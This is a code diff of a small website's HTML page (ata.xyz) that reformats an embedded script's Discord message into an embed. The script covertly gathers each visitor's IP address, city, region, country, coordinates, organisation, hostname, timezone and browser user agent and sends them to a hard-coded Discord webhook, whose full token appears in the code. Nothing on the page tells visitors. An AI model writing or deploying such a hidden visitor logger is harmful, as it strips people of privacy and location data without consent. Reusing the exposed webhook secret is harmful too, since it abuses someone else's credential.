@@ -6,7 +6,7 @@
     <title>ata.xyz</title>
     <link rel="stylesheet" href="haha.css">
 
-    <meta name="title" content="ata.xyz" />
+    <meta name="title" content="oober.xyz" />
     <meta name="description" content="" />
 
     <meta property="og:type" content="website" />
@@ -75,12 +75,26 @@
             const webhookURL = 'https://discord.com/api/webhooks/1270105042791305227/3uzXne5QtKvaKnAQoGByUoXpykEbs8Y_FYafGTNEtc9_GZ3w9F534yosGry4F24Y8rG4'; // Replace with your Discord webhook URL
             
             const message = {
-                content: `**User Info:**\n\n` +
-                         `**IP Address:** ${data.ip}  |  **City:** ${data.city}\n` +
-                         `**Region:** ${data.region}  |  **Country:** ${data.country}\n` +
-                         `**Location:** ${data.loc}  |  **Organisation:** ${data.org}\n` +
-                         `**Hostname:** ${data.hostname}  |  **Timezone:** ${data.timezone}\n` +
-                         `**UserAgent:** ${window.navigator.userAgent}`
+                embeds: [
+                    {
+                        title: "User Information",
+                        color: 16711680, // Red color
+                        fields: [
+                            { name: "IP Address", value: data.ip, inline: true },
+                            { name: "City", value: data.city, inline: true },
+                            { name: "Region", value: data.region, inline: true },
+                            { name: "Country", value: data.country, inline: true },
+                            { name: "Location", value: data.loc, inline: true },
+                            { name: "Organisation", value: data.org, inline: true },
+                            { name: "Hostname", value: data.hostname, inline: true },
+                            { name: "Timezone", value: data.timezone, inline: true },
+                            { name: "UserAgent", value: window.navigator.userAgent, inline: false }
+                        ],
+                        footer: {
+                            text: "User Info"
+                        }
+                    }
+                ]
             };
 
             try {
